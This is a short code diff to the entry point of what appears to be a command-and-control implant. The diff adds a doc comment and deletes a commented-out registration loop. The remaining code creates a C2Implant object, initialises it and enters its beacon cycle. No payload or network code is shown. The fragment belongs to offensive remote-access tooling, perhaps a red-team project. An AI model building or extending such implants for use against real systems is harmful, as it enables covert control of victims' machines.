@@ -32,22 +32,17 @@
 #include "core/c2.h"
 #include "_debug/debug.h"
 
+/**
+ * @brief EXE Entrypoint into the program
+ * 
+ * @return int 
+ */
 int main() {
     DEBUG_LOG("[main] Implant executable started. Initializing C2Implant...");
 
     //call this once to setup the implant
     C2Implant c2implant;
     c2implant.init();
-    //C2Implant implant;
-
-    //while (1) {
-    //    //on success, break to implant.cycle()
-    //    if (c2implant.register_implant() == 1) {
-    //        break;
-    //    }
-    //    //get rid of me, just a debug to prevent a register loop
-    //    Sleep(5000);
-    //}
 
     DEBUG_LOG("[main] Initialization complete. Entering c2implant.cycle()");
     c2implant.cycle();
